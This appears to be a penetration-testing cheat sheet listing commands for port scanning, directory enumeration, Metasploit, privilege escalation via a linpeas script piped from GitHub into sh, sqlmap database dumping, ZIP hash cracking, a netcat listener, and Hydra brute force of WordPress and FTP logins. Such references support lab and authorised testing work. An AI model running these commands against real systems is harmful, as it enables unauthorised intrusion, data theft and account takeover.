# HackCmds
Collection of useful penetration testing and hacking commands.

[Aller à "Ma Section"](#privilege-escalation)
[Aller à "Ma Section"](#privilege-escalation)


----

## Scanning
- Quick Scan (Only Ports)
````
rustscan -g --ulimit 5000 -a 192.168.31.113
````

- Intermediate Scan
````
rustscan --ulimit 5000 -a $ip -- -A
````

- Full Scan
````
sudo rustscan  --ulimit 5000 -a 192.168.31.113 -- -A -sN --top-ports 1024 --script=vuln -oX scan.xml --reason --stats-every 5s
xsltproc scan.xml -o scan.html
open scan.html
````
----

## Gobuster Directory Enumeration
- Basic
````
sudo gobuster dir -w <WORDLIST> -u <TARGET IP>
````

- Basic recursive
````
sudo gobuster dir -w <WORDLIST> -u <TARGET IP> -r
````

- With extension
````
sudo gobuster dir -u http://<TARGET IP>/ -w <WORDLIST> -x <EXTENSIONS>
````
----

## Metasploit
- Open console
````
msfconsole
````

- Search for exploit
````
search <SERVICE AND VERSION>
````

- Show options
````
show options
````

- Set the exploit
````
set <EXPLOIT NAME>
````

- Launch the exploit
````
run
````

----

## Privilege Escalation

- Linepeas (quick enumeration)
````
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
````

- Find bin with setuid or setgid activated
````
find / -perm +6000 2>/dev/null | grep '/bin/'
````

- Usefull link :

[GTFOBINS](https://gtfobins.github.io/)

---

## SQLMAP

### Basic Crawl and Detection
- Crawling a site with depth 2, looking for forms, and using batch mode to avoid prompts:
````
sqlmap -u 'http://192.168.31.79/' --crawl=2 --forms --batch
````

### Fetching Database Details

- Test for SQL injection on a specific URL:
````
sqlmap -u "https://example.com/page.php?id=1"
````

- Discover databases on a vulnerable URL:
````
sqlmap -u "https://example.com/page.php?id=1" --dbs
````

### Exploring Specific Databases and Tables

- Fetch tables from a specified database:
````
sqlmap -u 'http://example.com//?page=member&id=1&Submit=Submit#' -D <DATABASE_NAME> --tables
````

- Dump the users table from the Member_Sql_Injection database:
````
sqlmap -u "https://example.com/page.php?id=1" -D <DATABASE_NAME> -T <TABLE_NAME> --dump
````

### Comprehensive Dump

- Dump all tables from the <DATABASE_NAME> database:
````
sqlmap -u 'http://example.com//?page=member&id=1&Submit=Submit#' -D <DATABASE_NAME> --dump-all
````

----

## Crack with john

- ZIP password protected
````
zip2john tocrack.zip > hash.txt
john hash.txt
````

----

## Local Server

- With netcat
````
nc -lvnp 9000
````

- Web server with Python
````
sudo python3 -m http.server 80
````

----

## SSH

- Upload file
````
scp <FILE> <USERNAME>@<SERVER_IP>:<DESTINATION>
````

- Connect to SSH with idrsa
````
chmod 600 id_rsa
ssh -i <ID_RSA_FILE> <USERNAME>@<SERVER_IP>
````

----

## Hydra Brute Force

- Find Uername / Password WP
````
hydra -L <WORDLIST> -p test <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
````
````
hydra -l <FOUND_USERNAME> -P <WORDLIST> <TARGET_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:<FAILED_MESSAGE>" -t 30
````

- Bruteforce FTP
````
hydra -l chris -P ~/Desktop/shared/Perso-Script/wordlist/rockyou.txt ftp://10.10.17.164 -V -I
````
----


